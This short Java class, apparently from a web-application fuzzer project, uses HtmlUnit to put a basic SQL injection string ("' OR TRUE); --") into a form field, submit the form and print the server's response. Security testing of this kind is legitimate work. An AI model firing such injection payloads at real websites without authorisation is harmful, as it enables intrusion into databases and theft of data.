package com.fuzzer.exploits;

import java.io.IOException;

import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;

public class InputExploit {

	private final String BASIC_SQL_INJECTION = "' OR TRUE); --";
	
	public void trySQLInjection(HtmlInput inputField, HtmlForm submitForm){
		try {
			inputField.setValueAttribute(BASIC_SQL_INJECTION);
			HtmlSubmitInput submit = (HtmlSubmitInput) submitForm.getFirstByXPath("//input[@id='submit']");
			System.out.println(submit.<HtmlPage> click().getWebResponse().getContentAsString());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
